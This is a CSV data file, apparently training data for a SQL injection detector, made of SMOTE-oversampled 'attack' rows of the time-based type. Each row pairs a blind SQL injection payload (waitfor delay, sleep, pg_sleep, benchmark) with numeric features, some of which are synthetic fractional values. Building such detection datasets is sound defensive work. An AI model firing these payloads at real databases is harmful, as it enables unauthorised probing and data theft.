id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000099,attack,time,1  )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000125,1.4614240181199085,30.88779273412831,19.887792734128315,3.9872599281176493,12.0,4.0,7.0,7.887792734128314,0.38890259082339607,0.129634196941132,0.22685984464698103,0.2546033675884909,2.0,0.44389636706415686,2.0,0.0,0.0,0.0,0.0,1.0,0.4438963670641569,0.0,0.0,2.0,1.0,0.44389636706415686,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000100,attack,time,waitfor delay '0:0:5' and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000068,1.0301877296658106,50.859461272681614,20.760359151545593,3.416757996380154,15.0,3.3801795757727966,20.09910212113602,12.380179575772797,0.2951758559300533,0.06679393803851671,0.39413075443488127,0.2438994515965487,5.380179575772797,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.619820424227204,1.3801795757727962,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000101,attack,time,1'   )    )    rlike sleep  (  5  )  #,nearest_attack_euclidean,R000243,1.2377875425130782,40.08958065388668,13.514930108981112,2.542570841789164,10.0,1.9999999999999998,22.05972043592445,6.029860217962225,0.2508511586807877,0.05017023173615754,0.5496027926156324,0.14937581696742236,0.5149301089811128,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,4.514930108981113,0.0,0.0,0.0,-1.1102230246251565e-16,0.5149301089811127,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000102,attack,time,"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",nearest_attack_euclidean,R000168,1.0216886912640986,53.794223157234555,19.47051789517696,3.2027931121295152,19.058964209646078,1.7352589475884805,24.26474105241152,8.73525894758848,0.3537159994208288,0.0324731394567791,0.45113541779116617,0.16267544333122588,0.0,3.735258947588481,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.26474105241151935,0.0,0.0,0.0,1.0,0.7352589475884805,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000103,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.8260076463193564,34.437214728543125,17.0,3.4538358775467914,13.0,0.7125570542913748,11.149771782834502,9.57488589141725,0.3790400386993137,0.02159263800882953,0.3218264127177889,0.2775409105740679,0.0,0.2874429457086254,2.0,0.0,0.0,0.0,0.0,2.2874429457086256,0.0,5.0,0.0,2.0,0.0,0.2874429457086254,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000104,attack,time,"select sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000197,0.27918509922157325,49.2918626600537,16.194575106702466,2.826781290080163,14.194575106702466,1.0,25.0,9.097287553351233,0.2878524737000271,0.020293617480355686,0.5073404370088923,0.18451347181072494,0.0,3.0,0.0,0.0,0.0,1.0,0.0,4.0,1.0,0.09728755335123318,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9027124466487668,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.902712446648767
SMOTE_000105,attack,time,"1""   )    )    or sleep  (  5  )  #",nearest_attack_euclidean,R000152,0.8985067529143468,34.62805177785634,12.62805177785634,2.4219294068475503,7.0,1.9999999999999998,20.0,5.62805177785634,0.20218793071849211,0.05776798020528346,0.5776798020528346,0.16236428702338981,0.0,0.6280517778563406,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.6280517778563407,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000106,attack,time,select sleep  (  5  )  --,nearest_attack_euclidean,R000190,1.897013229535905,26.467951410992903,12.957268547990541,3.0852328176348025,11.0,1.4893171369976348,9.978634273995269,4.0,0.4169321921129686,0.055378538591354234,0.3760775630727794,0.15161170622289769,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.5106828630023652,0.0,0.0,0.0,0.0,0.4893171369976348,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000107,attack,time,select sleep  (  5  )   and 'beuk'  =  'beuk,nearest_attack_euclidean,R000165,0.2797421394771264,44.997694523325634,17.80046109533487,3.4586890251976232,22.0,1.0,15.79815561866051,6.199538904665127,0.48981944363953434,0.022264520165433385,0.35025669265824577,0.13765934353678652,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.1995389046651272,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000108,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000096,0.40208687258424786,49.45452603962099,22.77921800566014,3.7908514938119717,15.0,11.0,16.67530803396085,6.779218005660142,0.30444835535012704,0.22326212725675987,0.3352313908283536,0.1370581265647595,2.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,1.7792180056601417,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000109,attack,time,"1"" and sleep  (  5  )  #",nearest_attack_euclidean,R000180,1.4556430972677052,25.407249869595866,14.469083289865289,3.191077689866466,8.938166579730577,1.9999999999999998,10.0,4.469083289865289,0.3507067885135292,0.07898996953828435,0.39494984769142183,0.1753533942567646,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.4690832898652886,0.0,0.0,-1.1102230246251565e-16,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5309167101347114,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5309167101347114
SMOTE_000110,attack,time,"waitfor delay '0:0:5' and ""%""  =  """,nearest_attack_euclidean,R000091,0.5537423903079873,35.0,19.85538744563548,3.9232306388747906,15.0,3.0,8.0,9.0,0.42857142857142855,0.08571428571428572,0.22857142857142856,0.2571428571428571,2.4338376630935663,2.5661623369064337,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.855387445635478,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000111,attack,time,select pg_sleep  (  5  )   and 'qfaz' like 'qfaz,nearest_attack_euclidean,R000285,0.07928791966415147,47.928016042936505,20.88002673822751,3.8245889531883646,27.952010695291,1.0,13.0,5.976005347645502,0.5832000297091418,0.020866659239381247,0.2712665701119562,0.12466674093952086,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.976005347645502,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.023994652354498158,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.023994652354498
SMOTE_000112,attack,time,1' where 9708  =  9708 or sleep  (  5  )  --,nearest_attack_euclidean,R000189,0.5446769508591806,44.0,19.82645287658677,3.5345636983270037,12.0,10.0,16.0,6.0,0.2727272727272727,0.22727272727272727,0.36363636363636365,0.13636363636363635,0.8264528765867696,0.17354712341323036,2.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,3.0,0.8264528765867696,0.1735471234132303,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000113,attack,time,1' or sleep  (  5  )   and 'udqz'  =  'udqz,nearest_attack_euclidean,R000240,1.4148122677221968,44.418987532161694,19.945991688107796,3.5414788795472676,19.418987532161694,1.9999999999999998,16.0,7.0,0.4365392761901124,0.04507685790479101,0.36061486323832803,0.15776900266676855,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.5270041559461022,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.527004155946102
SMOTE_000114,attack,time,"select pg_sleep  (  5  )   and ""ilyw"" like ""ilyw",nearest_attack_euclidean,R000194,0.2569988719895867,48.910418333120376,20.0,3.7074550452197697,28.0,1.0,13.728334666496298,6.182083666624075,0.5733130057675431,0.020475464491697973,0.2799232019108716,0.12628832782988733,0.0,3.0,0.0,0.0,0.0,0.0,0.0,2.1820836666240746,0.0,1.0,0.0,-1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000115,attack,time,1  )   and sleep  (  5  )  #,nearest_attack_euclidean,R000172,0.8308434670945932,31.236033723487736,13.0,2.6422008798475414,7.999999999999999,1.9999999999999998,16.696694769573114,4.539338953914623,0.26259975911794475,0.06564993977948619,0.5269669476957312,0.14478335340683793,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,3.5393389539146227,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000116,attack,time,1%' and sleep  (  5  )  #,nearest_attack_euclidean,R000137,1.2864356947479758,25.0,15.0,3.2350849518197795,7.999999999999999,1.9999999999999998,10.0,5.0,0.32,0.08,0.4,0.2,0.5873102780610097,0.4126897219389903,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,-1.1102230246251565e-16,0.5873102780610095,0.4126897219389903,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000117,attack,time,"select sleep  (  5  )   and   (  ""tlbj"" like ""tlbj",nearest_attack_euclidean,R000127,0.04461742459823661,50.05867119456791,17.988265761086417,3.4376565866845126,25.96479728325926,1.011734238913581,17.058671194567907,6.023468477827162,0.518805241128799,0.020192014818585874,0.3407040543348149,0.12029868971780025,0.0,3.0117342389135815,0.0,0.0,0.0,0.0,0.0,3.011734238913581,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.9882657610864187,0.0,0.0,0.0,1.011734238913581,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000118,attack,time,1   )    )    waitfor delay '0:0:5'--,nearest_attack_euclidean,R000265,0.5429452278853124,38.92588348966355,19.0,3.5085503993315417,12.0,4.0,14.54070679173084,8.38517669793271,0.30945263714545523,0.10315087904848508,0.37192385194878697,0.21547263185727278,2.0,-1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,2.38517669793271,0.0,0.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000119,attack,time,select pg_sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000219,1.2341138432186587,44.921748531478556,18.0,3.407833650275804,19.28116568765237,1.0,16.640582843826184,8.0,0.4252397360588644,0.022633774744481472,0.3710562912408024,0.18107019795585172,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.410145710956546,0.5898542890434539,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000120,attack,time,"1""   )    )     )   or sleep  (  5  )  #",nearest_attack_euclidean,R000280,0.265814787241808,40.266335320856385,13.088778440285463,2.338984017337747,7.266335320856388,1.9999999999999998,24.0,7.0,0.18010992185364,0.04969030776644606,0.5962836931973527,0.1739160771825612,0.0,1.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9112215597145373,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9112215597145372
SMOTE_000121,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000012,2.5315054217489834,29.369045209161566,20.776783906871174,4.2264036320618406,14.369045209161566,2.8154773954192165,2.4077386977096076,9.776783906871174,0.48690045177708896,0.09861613959339616,0.08351470634489211,0.3309687022846227,2.4077386977096085,-1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,0.0,0.40773869770960836,2.3690452091615666,0.5922613022903916,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000122,attack,time,select pg_sleep  (  5  )   and   (  1044  =  1044,nearest_attack_euclidean,R000141,0.019790109555641706,49.024459719005776,18.993885070248556,3.3941336039812295,15.987770140497112,9.0,19.036689578508664,5.0,0.32614916495196994,0.18358870332266003,0.3882684076572256,0.10199372406814444,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,3.006114929751444,0.0,0.9938850702485558,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.006114929751444231,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.006114929751444
SMOTE_000123,attack,time,1  )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000125,2.437708310268814,31.892554234967633,20.514043387974105,4.056583052308857,13.514043387974105,3.2429783060129473,6.242978306012947,8.892554234967632,0.42162919125677295,0.1044944116576361,0.19908711384344285,0.27478928324214813,2.0,-1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,1.0,0.0,1.5140433879741053,0.3785108469935263,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000124,attack,time,select sleep  (  5  )   and   (  'qcsv'  =  'qcsv,nearest_attack_euclidean,R000289,0.34663796901983085,47.81741442402058,17.236517115195884,3.3353919114486774,22.0,1.0,18.053931539216464,6.763482884804116,0.46104679159162676,0.02095667234507395,0.3766752186295063,0.14132131743379295,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.763482884804116,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000125,attack,time,"1""   )    )     )   waitfor delay '0:0:5'--",nearest_attack_euclidean,R000079,0.028258507407958638,42.952683241526074,20.01182918961848,3.470431737396851,12.0,4.0,16.952683241526074,10.0,0.2794083488978456,0.09313611629928187,0.3946152440546678,0.23284029074820467,2.0,1.0,2.0,0.0,0.0,0.0,0.0,2.9881708103815185,0.011829189618481117,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000126,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000028,2.4827748224608364,54.55349549168297,20.776747745841487,3.2318377319457587,12.330243237524458,10.0,24.0,8.223252254158513,0.22571798856671238,0.1833499297026313,0.44003983128631513,0.15089225044434115,0.0,1.0,0.0,0.0,0.0,0.22325225415851396,0.0,4.776747745841486,0.2232522541585139,0.0,1.0,0.2232522541585138,0.0,1.0,0.0,1.0,0.0,0.22325225415851396,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.22325225415851396,0.7767477458414861,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000127,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000028,0.41183186432783275,54.27401750092231,20.85480350018446,3.2392982470396205,13.0,10.145196499815537,23.419214000737846,7.709607000368923,0.2397955536320036,0.1873620481747751,0.4310837636430713,0.14175863455014992,0.0,0.8548035001844618,0.0,0.0,0.0,0.0,0.0,4.854803500184461,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,0.8548035001844618,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000128,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000006,0.03687476619221736,37.12497029800394,24.0,4.298845397267086,16.0,1.9999999999999998,6.107117398289088,13.017852899714848,0.4312042231154405,0.053900527889430054,0.16413606999304217,0.35075917900208736,2.0,1.0,2.0,0.0,0.0,0.0,1.0,1.017852899714848,0.0,4.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000129,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000088,1.0683939968267098,55.32540532890322,23.0,3.8359351022657866,24.3016213156129,4.0,16.34918934219355,10.674594671096775,0.438995081101927,0.07230466840402178,0.29567322182769173,0.19302702866635948,6.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.6745946710967755,0.0,2.0,0.0,0.0,0.0,0.6745946710967754,1.0,0.0,0.0,0.0,0.0,0.6745946710967755,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000130,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )   ",nearest_attack_euclidean,R000128,1.589237213900517,54.61299706764986,17.92466862156676,3.0087859455945845,11.0,10.0,26.150662756866478,7.462334310783381,0.20156908094873704,0.1832446190443064,0.4781917777932368,0.13699452221371977,0.4623343107833803,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,4.53766568921662,0.0,0.0,1.0,1.0,0.4623343107833803,0.0,0.0,0.4623343107833803,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000131,attack,time,select pg_sleep  (  5  )   and 'rpka'  =  'rpka,nearest_attack_euclidean,R000086,0.542387350732692,48.91094706027642,18.617810587944717,3.534220211675127,24.0,1.0,16.528757648221138,7.3821894120552844,0.49187286029188454,0.020494702512161858,0.33681972322514203,0.15081271397081153,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.3821894120552844,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
